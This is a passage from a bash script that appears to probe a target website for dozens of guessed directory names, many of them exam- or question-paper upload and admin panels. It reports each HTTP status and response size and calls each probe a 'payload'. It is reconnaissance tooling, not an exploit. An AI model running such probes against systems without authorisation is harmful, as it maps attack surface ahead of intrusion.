         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ModuleQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ModuleQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncTestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncTestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_Uploader/"]: "
